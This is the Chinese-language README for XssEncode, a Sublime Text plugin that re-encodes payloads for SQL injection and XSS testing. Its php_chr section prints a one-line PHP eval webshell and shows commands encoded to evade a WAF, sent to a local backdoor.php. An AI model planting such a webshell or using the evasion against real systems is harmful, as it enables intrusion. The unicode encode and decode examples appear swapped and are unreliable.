# Sublime XssEncode

[English](README.md) | [中文说明](README_CN.md)

XssEncode 是一个字符编码转换工具，这个工具可以在你进行 SQL 注入、XSS 测试、加密解密时快速的对 Payload 进行转换。

**转换你选中的字符，如果未选中则默认转换整个文本域的内容**

XssEncode 支持 Sublime Text 2 和 3.

如何安装
----

强烈推荐使用 [Package Control](https://sublime.wbond.net/installation) 进行查找、安装、升级 **XssEncode**

当然，你也可以按照以下步骤手动进行安装：

1. 打开 Sublime Text Packages 目录（可直接通过菜单中的 Browse Packages 进入该目录）
    * OS X: ~/Library/Application Support/Sublime Text 3/Packages/
    * Windows: %APPDATA%/Sublime Text 3/Packages/
    * Linux: ~/.Sublime Text 3/Packages/ or ~/.config/sublime-text-3/Packages

2. Clone 本仓库到该目录下
    
    ```
    git clone https://github.com/Medicean/SublimeXssEncode.git
    ```

3. 将目录名重命名为：**xssencode**


改动日志
---

详情见：[ChangeLog](CHANGELOG.md)

转换命令样例：
----

> 你可以直接通过命令快捷键（Win: `ctrl+shift+p`, OSX: Command+shift+p），然后输入 `xssencode` 选择你要进行的操作。或者可以点击菜单栏 `tools` => `XssEncode` 选择你要进行的操作。

* `html_escape`

    HTML 实体编码
    
    **eg:**
    
    `a1@&` => `a1@&amp;`

* `html10_encode`
    
    HTML 10 进制实体编码
    
    **eg:**
    
    `a1@&` => `&#97;&#49;&#64;&#38;`

* `html16_encode`

    HTML 16 进制实体编码

    **eg:**
    
    `a1@&` => `&#x61;&#x31;&#x40;&#x26;`

* `html_unescape`

    HTML 实体解码
    
    **eg:**
    
    `a&#97;&#x61;&amp;` => `aaa&`

* `base64_encode`

    Base64 编码
    
    **eg:**
    
    `a1@&` => `YTFAJg==`

* `base64_decode`

    **eg:**
    
    `YTFAJg==` => `a1@&`

* `url_encode`

    URL 编码

    **eg:**
    
    `alert(/xss/);` => `alert%28/xss/%29%3B`

* `url_decode`

    **eg:**
    
    `alert%28/xss/%29%3B` => `alert(/xss/);`

* `string_from_char_code`

    **eg:**
    
    `alert(/xss/);` => `String.fromCharCode(97,108,101,114,116,40,47,120,115,115,47,41,59)`

* `mysql_char`

    **eg:**
    
    `123` => `CHAR(49,50,51)`
    
    You can excute the sql commands below.
    
    `select 123;`
    
    `select CHAR(49,50,51);`
    
* `oracle_chr`

    **eg:**
    
    `123` => `CHR(49)||CHR(50)||CHR(51)`
    
    You can excute the sql commands below.
    
    `select 123;`
    
    `select CHR(49)||CHR(50)||CHR(51);`

* `php_chr`
    
    转换为 PHP chr 函数连接形式.
    
    **eg:**
    
    假如现在我们有一个 PHP 的 WebShell, 内容是： `<?php @eval($_REQUEST[cmd]);?>`
    
    如果你要绕过一些安全防护（比如：WAF），你可以把你要执行的命令转换一下，比如下面这个例子：
    
    `ls -al` => `CHR(108).CHR(115).CHR(32).CHR(45).CHR(97).CHR(108)`
    
    然后，你可以这样发起请求：
    
    `http://127.0.0.1/backdoor.php?cmd=system(CHR(108).CHR(115).CHR(32).CHR(45).CHR(97).CHR(108));`
    
* `string_to_hex`

    将字符转换成 16 进制,在 SQL 注入中使用的非常多

    **eg:**
    
    `root` => `726f6f74`

    你可以在 mysql 命令行下执行下面两条指令，查看效果：

    `SELECT user from mysql.user where user='root';`
    
    `SELECT user from mysql.user where user=0x726f6f74;`

* `hex_to_string`

    **eg:**
    
    `726f6f74` => `root`

* `unicode_decode`

    **eg:**
    
    `测试` => `\u6d4b\u8bd5`

* `unicode_encode`

    **eg:**
    
    `\u6d4b\u8bd5` => `测试`

* `md5_encode`

    **eg:**
    
    `1` => `c4ca4238a0b923820dcc509a6f75849b`
